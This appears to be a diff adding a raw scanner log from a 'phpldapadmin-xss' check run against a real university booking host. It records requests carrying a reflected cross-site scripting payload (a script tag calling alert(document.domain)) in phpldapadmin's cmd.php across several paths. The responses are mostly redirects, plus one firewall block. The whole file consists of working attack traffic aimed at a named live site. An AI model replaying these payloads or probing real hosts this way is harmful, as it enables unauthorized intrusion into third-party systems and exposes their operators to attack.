@@ -1,0 +1,242 @@
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET /phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 831
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3209806=5+ugih3YSzmU2zk5DeCIjPtxk2gAAAAAQUIPAAAAAAAHzws49KHKCxyI5Ww+JZyg; expires=Thu, 06 Aug 2026 07:06:48 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=SOm7Umz2g1xM1Larov5JA/txk2gAAAAAU+eiES8vXtzPcM59Pl65Dw==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 1-1018290-0 0NNN RT(1754493436250 13) q(0 -1 -1 -1) r(0 -1) B15(1,903758,0) U24
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/A-Friends-My-nord-Say-Macb-Thout-affic-Dring-boy" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=1-1018290-0%200NNN%20RT%281754493436250%2013%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%281%2c903758%2c0%29%20U24&incident_id=237000430032578664-11523478875081409&edet=15&cinfo=01000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032578664-11523478875081409</iframe></body></html>
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+
+
+GET /htdocs/index.php/index.php?redirect=true&meth=ajax HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://bookings.mdhs.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+Set-Cookie: visid_incap_3209806=vTz/T2dLSKukrg8bHMkjXvtxk2gAAAAAQUIPAAAAAADfeLBlUDzEl8EK5/aEOX3o; expires=Thu, 06 Aug 2026 07:06:48 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=3ymkKSb+8FtR1Larov5JA/txk2gAAAAA2ZPSat39aCnhB8Mm9AhVcg==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 1-1018292-0 0NNN RT(1754493436251 18) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET /htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://bookings.mdhs.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+Set-Cookie: visid_incap_3209806=bq2Jc0r7R6e49h0YraOsEPtxk2gAAAAAQUIPAAAAAACk5shSuQ90SWJVJZR7lPAF; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=mHmIDEe12l9T1Larov5JA/txk2gAAAAA5vRGy9R/TLN4rbRBpot5Jg==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 0-684476-0 0NNN RT(1754493436251 19) q(0 -1 -1 -1) r(0 -1) B13(1,903758,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://bookings.mdhs.unimelb.edu.au/
+Set-Cookie: visid_incap_3209806=5sBIITd6R5CgkwwwpRez2ftxk2gAAAAAQUIPAAAAAAAcJiWVbATx5fnY1gbiEzOw; expires=Thu, 06 Aug 2026 07:06:48 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=NTomYMFfoXVU1Larov5JA/txk2gAAAAAlLS2z3phcwY9GErTHacJLA==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 1-1018291-0 0NNN RT(1754493436251 21) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+
+
+GET /phpldapadmin/index.php?redirect=true&meth=ajax HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://bookings.mdhs.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+Set-Cookie: visid_incap_3209806=0lV6AzQHRDWEYzJ6tHprR/txk2gAAAAAQUIPAAAAAAC3xYpYmUuQvBg6n4+ilrme; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=iDqEABN0ZQJV1Larov5JA/txk2gAAAAAPDGXsZVubnER1wshlaE1fw==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12101773-0 0NNN RT(1754493436250 22) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://bookings.mdhs.unimelb.edu.au/
+Set-Cookie: visid_incap_3209806=WFzoFxYfTuGatp7DSCp68Ptxk2gAAAAAQUIPAAAAAABe7pX69jQUyrr7RxgZwbdN; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=xh0GVLzH/2NW1Larov5JA/txk2gAAAAAH7MPd8IxDJhI4OSBPlpFfQ==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 0-684475-0 0NNN RT(1754493436250 23) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET //cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://bookings.mdhs.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+Set-Cookie: visid_incap_3209806=wszH4riHTJCiM/0ezomNH/txk2gAAAAAQUIPAAAAAAACYJ0+y7JnC7PU7zoWuU0T; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=0yuGV5ra/BFX1Larov5JA/txk2gAAAAAaGpfGv8TonMo861dbjAmVQ==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12101768-0 0NNN RT(1754493436250 24) q(0 -1 -1 -1) r(0 -1) B13(1,903758,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:16 GMT
+Refresh: 0;url=Web?
+Set-Cookie: visid_incap_3209806=+PHIU5bCQIGpNPd/AqiO/vxxk2gAAAAAQUIPAAAAAAAXGN/zm0Pvj4BoHATNJ/t2; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: nlbi_3209806=6lBUOTHimWjSZQW2O8YM8AAAAAASun45oNU745CSJFhPuZYO; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=qLNZXPgJgiCh1Larov5JA/xxk2gAAAAAVoPG/6O+uOBJH/U1z2iKAA==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Cdn: Imperva
+X-Iinfo: 8-4188669-4188670 NNNY CT(217 221 0) RT(1754493436250 10) q(0 0 0 -1) r(2 2) U24
+X-Powered-By: PHP/8.0.30
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au//index.php?redirect=true&meth=ajax
+
+
+GET //index.php?redirect=true&meth=ajax HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au//index.php?redirect=true&meth=ajax
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:16 GMT
+Refresh: 0;url=Web?redirect%3Dtrue%26meth%3Dajax
+Set-Cookie: visid_incap_3209806=egrCMtqdQf6dNxjma9RPCfxxk2gAAAAAQUIPAAAAAACulel9CUC0eLYTziKfaB9S; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: nlbi_3209806=cfeWRhzSKXeXcsPEO8YM8AAAAAAppCWenXtLxSIAGg8xT7tL; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=ISwkPCtp22Cj1Larov5JA/xxk2gAAAAAD5MUMN+FgsfiPNUoF68fIA==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Cdn: Imperva
+X-Iinfo: 0-684474-684477 NNNY CT(215 221 0) RT(1754493436250 12) q(0 0 0 -1) r(2 2) U24
+X-Powered-By: PHP/8.0.30
+Content-Length: 0
+
+
